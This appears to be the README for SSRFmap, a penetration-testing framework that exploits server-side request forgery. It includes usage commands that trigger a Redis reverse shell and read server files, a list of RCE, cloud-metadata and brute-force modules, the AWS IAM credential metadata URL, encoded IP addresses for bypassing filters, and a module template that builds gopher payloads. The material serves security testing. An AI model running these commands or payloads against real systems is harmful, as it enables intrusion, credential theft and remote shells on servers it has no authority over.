# SSRFmap [![Python 3.4+](https://img.shields.io/badge/python-3.4+-blue.svg)](https://www.python.org/downloads/release/python-360/)

SSRF are often used to leverage actions on other services, this framework aims to find and exploit these services easily. SSRFmap takes a Burp request file as input and a parameter to fuzz.

> Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.

## Guide / RTFM

Basic install from the Github repository.

```powershell
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap/
pip3 install -r requirements.txt
python3 ssrfmap.py

usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]
                  [--lhost LHOST] [--lport LPORT] [--uagent USERAGENT]
                  [--ssl [SSL]] [--level [LEVEL]]

optional arguments:
  -h, --help          show this help message and exit
  -r REQFILE          SSRF Request file
  -p PARAM            SSRF Parameter to target
  -m MODULES          SSRF Modules to enable
  -l HANDLER          Start an handler for a reverse shell
  --lhost LHOST       LHOST reverse shell
  --lport LPORT       LPORT reverse shell
  --uagent USERAGENT  User Agent to use
  --ssl [SSL]         Use HTTPS without verification
  --level [LEVEL]     Level of test to perform (1-5, default: 1)
```

The default way to use this script is the following.

```powershell
# Launch a portscan on localhost and read default files
python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan

# Launch a portscan against an HTTPS endpoint using a custom user-agent
python ssrfmap.py -r data/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"

# Triggering a reverse shell on a Redis
python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242

# -l create a listener for reverse shell on the specified port
# --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload
# --level : ability to tweak payloads in order to bypass some IDS/WAF. e.g: 127.0.0.1 -> [::] -> 0000: -> ...
```

A quick way to test the framework can be done with `data/example.py` SSRF service.

```powershell
FLASK_APP=data/example.py flask run &
python ssrfmap.py -r data/request.txt -p url -m readfiles
```

## Modules

The following modules are already implemented and can be used with the `-m` argument.

| Name           | Description    |
| :------------- | :------------- |
| `fastcgi`      | FastCGI RCE |
| `redis`        | Redis RCE |
| `github`       | Github Enterprise RCE < 2.8.7 |
| `zabbix`       | Zabbix RCE |
| `mysql`        | MySQL Command execution |
| `docker`       | Docker Infoleaks via API |
| `smtp`         | SMTP send mail |
| `portscan`     | Scan ports for the host |
| `networkscan`  | HTTP Ping sweep over the network |
| `readfiles`    | Read files such as `/etc/passwd` |
| `alibaba`      | Read files from the provider (e.g: meta-data, user-data) |
| `aws`          | Read files from the provider (e.g: meta-data, user-data) |
| `gce`          | Read files from the provider (e.g: meta-data, user-data) |
| `digitalocean` | Read files from the provider (e.g: meta-data, user-data) |
| `socksproxy`   | SOCKS4 Proxy |
| `smbhash`      | Force an SMB authentication via a UNC Path |
| `tomcat`       | Bruteforce attack against Tomcat Manager |

## Contribute

I <3 pull requests :)
Feel free to add any feature listed below or a new service.

- aws and other cloud providers - extract sensitive data from http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy and more
- handle request with file in requester
- requester injection point in file (if param = None, check SSRFMAP in reqFile and replace with the payload)
- add https://github.com/cujanovic/SSRF-Testing ip.py into the ip generator from core.utils

  ```powershell
  http://0xA9FEA9FE/ Dotless hexadecimal
  http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
  http://0251.00376.000251.0000376/ Dotted octal with padding
  ```

The following code is a template if you wish to add a module interacting with a service.

```python
from core.utils import *
import logging

name          = "servicename in lowercase"
description   = "ServiceName RCE - What does it do"
author        = "Name or pseudo of the author"
documentation = ["http://link_to_a_research", "http://another_link"]

class exploit():
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "4242"

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Handle args for reverse shell
        if args.lhost == None: self.SERVER_HOST = input("Server Host:")
        else:                  self.SERVER_HOST = args.lhost

        if args.lport == None: self.SERVER_PORT = input("Server Port:")
        else:                  self.SERVER_PORT = args.lport

        # Data for the service
        # Using a generator to create the host list
        # Edit the following ip if you need to target something else
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:
            port = "6379"
            data = "*1%0d%0a$8%0d%0aflus[...]%0aquit%0d%0a"
            payload = wrapper_gopher(data, ip , port)

            # Handle args for reverse shell
            payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
            payload = payload.replace("SERVER_PORT", self.SERVER_PORT)

            # Send the payload
            r = requester.do_request(args.param, payload)
```

You can also contribute with a beer IRL or with `buymeacoffee.com`

[![Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoff.ee/swissky)

## Thanks to the contributors

- [ttffdd](https://github.com/ttffdd)

## Inspired by

- [All you need to know about SSRF and how may we write tools to do auto-detect - Auxy](https://medium.com/bugbountywriteup/the-design-and-implementation-of-ssrf-attack-framework-550e9fda16ea)
- [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange Tsai](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [Blog on Gopherus Tool  -SpyD3r](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)
- [Gopherus - Github](https://github.com/tarunkant/Gopherus)
- [SSRF testing - cujanovic](https://github.com/cujanovic/SSRF-Testing)
